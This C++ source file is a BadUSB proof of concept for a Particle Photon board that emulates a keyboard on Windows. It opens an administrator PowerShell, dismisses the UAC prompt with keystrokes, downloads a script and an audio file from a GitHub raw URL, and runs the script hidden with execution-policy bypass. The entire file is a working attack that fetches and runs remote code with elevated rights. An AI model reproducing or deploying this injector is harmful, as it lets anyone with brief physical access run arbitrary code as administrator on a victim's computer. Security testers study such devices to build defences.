/*
 * Project particle-photon-badusb
 * Description: BadUSB penetration testing proof of concept for Photon board
 * Author:
 * Date:
 */

// EXAMPLE USAGE
// Use STARTUP() macro to avoid USB disconnect/reconnect (see begin() documentation)
STARTUP(Keyboard.begin());

void setup() {

  String url = "https://raw.githubusercontent.com/astral-grayson/particle-photon-badusb/main/trap.ps1";
  // String file = "31001_white_hot_safety_bath_ducky.jpg";
  String ride = "https://raw.githubusercontent.com/astral-grayson/particle-photon-badusb/main/ride.wav";

  String download_trap = "$down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = 'trap.ps1'; $down.DownloadFile($url,$file);";
  String download_ride = "$ride = '" + ride +"'; $ride_file = 'ride.wav'; $down.DownloadFile($ride,$ride_file);";
  String start_process = "Start-Process -FilePath 'powershell.exe' -WindowStyle hidden -ArgumentList '-executionPolicy bypass -noexit -file \"C:\\WINDOWS\\system32\\trap.ps1\"'";
  
  delay(100);
  // WIN+R to open Run
  Keyboard.press(KEY_LEFT_WINDOWS);
  // Keyboard.press(114);
  Keyboard.press(KEY_R);
  Keyboard.releaseAll();
  delay(350);

  // Start PowerShell as admin
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  Keyboard.click(KEY_RETURN);

  // wait for startup (kinda slow)
  delay(2500);

  // confirm (2x TAB, RETURN) running PowerShell as admin
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_RETURN);
  Keyboard.press(KEY_LALT);
  // Keyboard.press(121);
  Keyboard.press(KEY_Y);
  Keyboard.releaseAll();
  delay(750);

  // Run PowerShell command: save file at $url as $file and execute it
  // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
  // Saves file to Users\$user filesystem root
  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';");
  Keyboard.click(KEY_RETURN);
  delay(50);

  Keyboard.print(download_trap);
  Keyboard.click(KEY_RETURN);
  delay(50);

  Keyboard.print(download_ride);
  Keyboard.click(KEY_RETURN);
  delay(50);

  Keyboard.print(start_process);
  delay(50);

  // press return a bunch so we're sure to exit the window even on a failure
  Keyboard.print(';');
  for (int i=0; i < 4; i++) {
    Keyboard.click(KEY_RETURN);
  }
  delay(50);

  Keyboard.print("exit;");
  Keyboard.click(KEY_RETURN);

}

void loop() {

}